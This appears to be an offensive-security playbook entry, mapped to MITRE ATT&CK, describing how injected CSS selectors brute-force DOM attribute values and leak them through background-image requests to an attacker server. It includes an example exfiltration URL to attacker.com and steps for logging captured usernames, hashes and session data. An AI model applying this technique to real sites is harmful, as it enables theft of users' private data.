---
id: proc-exfiltrate-css-1245165
tags:
  - data-exfiltration
  - css-injection
type: procedure
tools:
  - '[[tools/Browser-Developer-Tools]]'
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exfiltration Over Unencrypted Non-C2 Protocol]]'
updated_at: '2025-12-14T17:26:21.883Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exfiltration Over Unencrypted Non-C2 Protocol]]'
---
# Exfiltrate Data via Malicious CSS Injection

## Summary

This procedure leverages the injected CSS to select and exfiltrate DOM data such as usernames, account hashes, IP addresses, and Referer headers by triggering background-image requests to the attacker server.

## Description

Once loaded, the CSS applies rules targeting elements like links with data-test-name attributes, brute-forcing values (e.g., 'A' for usernames starting with A) to construct exfiltration URLs. Each match sends a GET request with the data. Applies to web environments post-injection; outcomes include captured sensitive info on attacker server.

## Requirements

1. Successful CSS injection from prior steps
2. Attacker server logging incoming requests
3. Knowledge of target DOM structure

## Defense

Defensive measures and detection strategies:

- Disable or restrict CSS background-image to same-origin
- Obfuscate sensitive attributes and use JS to load styles
- WAF rules for anomalous outbound requests from CSS

## Objectives

1. Extract and transmit user-specific data
2. Capture session metadata (IP, User-Agent)
3. Validate exfiltration completeness

## Instructions

### Step 1: Monitor Attacker Server

**Context**: Set up logging to capture exfil requests.

Configure server to log GET parameters from /exfil endpoint.

> Use tools like tcpdump or access logs.

### Step 2: Trigger and Observe Exfiltration

**Context**: With CSS loaded, interact with page to apply selectors.

Reload or navigate in console; check logs for requests like http://attacker.com/exfil?data=username_hash.

> Brute-force selectors in CSS for full coverage.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exfiltration Over Unencrypted Non-C2 Protocol]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Browser-Developer-Tools]]

## Tags

- data-exfiltration
- css-injection
